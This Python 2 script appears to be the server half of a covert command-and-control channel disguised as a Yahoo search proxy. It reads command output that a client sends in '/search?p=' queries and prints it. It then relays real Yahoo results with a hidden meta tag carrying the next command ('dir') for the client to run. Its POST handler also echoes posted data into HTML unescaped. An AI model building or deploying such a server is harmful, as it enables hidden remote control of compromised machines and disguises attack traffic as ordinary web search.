#!/usr/bin/env python
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import SocketServer
import urllib
import bs4
import HTMLParser


class LinksParser(HTMLParser.HTMLParser):
  def __init__(self):
    HTMLParser.HTMLParser.__init__(self)
    self.recording = 0
    self.data = []

  # # <div id="web">20</div>
  # def handle_starttag(self, tag, attributes):
  #   if tag != 'div':
  #     return
  #   if self.recording:
  #     self.recording += 1
  #     return
  #   for name, value in attributes:
  #     if name == 'id' and value == 'web':
  #       break
  #   else:
  #     return
  #   self.recording = 1

  # <meta params="yahoosearchengine">
  def handle_starttag(self, tag, attributes):
    if tag != 'meta':
      return
    if self.recording:
      self.recording += 1
      return
    for name, value in attributes:
      if name == 'params' and value == 'yahoosearchengine':
        break
    else:
      return
    self.recording = 1

  def handle_endtag(self, tag):
    if tag == 'div' and self.recording:
      self.recording -= 1

  def handle_data(self, data):
    if self.recording:
      self.data.append(data)


class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        query = self.path
        prefix = '/search?p='
        if str(query).startswith(prefix):
            query = query[len(prefix):-1]
            client_cmd_output = urllib.unquote(query).decode('utf8')
            query = query.replace('%0D%0A', '')
            if len(query) > 20:
                query = query[:20]
            print client_cmd_output
            print query


        # tmp = query.split('?')
        # if len(tmp) > 1:
        #     param1 = str(tmp[1]).split('=')
        #     if len(param1) > 1:
        #         query = param1[1]
        #         client_cmd_output = urllib.unquote(query).decode('utf8')
        #         print client_cmd_output
        #         print query
        #         query = query.replace('%0D%0A', '')
        #         if len(query) > 20:
        #             query = query[:20]

        response = urllib.urlopen('http://search.yahoo.com/search?p=%s' % query).read()

        soup = bs4.BeautifulSoup(response)
        # create new link

        new_link = soup.new_tag("meta", property="oq:yahoo_search_engine", xcontent="dir")
        # insert it into the document
        soup.head.append(new_link)

        cc = soup.find(attrs={"property": "oq:yahoo_search_engine"})
        cmd = cc.attrs['xcontent']

        desc = soup.findAll(attrs={"params": "yahoosearchengine"})
        #print(desc[0]['content'].encode('utf-8'))



        # parser = LinksParser()
        # a = parser.feed(str(soup))
        # b = parser.get_starttag_text()
        # cmd = parser.data


        self._set_headers()
        #self.wfile.write("<html><body><h1>hi!</h1></body></html>")
        self.wfile.write(soup)

    def do_HEAD(self):
        self._set_headers()


    def do_POST(self):
        # Doesn't do anything with posted data
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        self._set_headers()
        self.wfile.write("<html><body><h1>POST!</h1><pre>" + post_data + "</pre></body></html>")




def run(server_class=HTTPServer, handler_class=S, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print ('Starting httpd...')
    httpd.serve_forever()


if __name__ == "__main__":
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()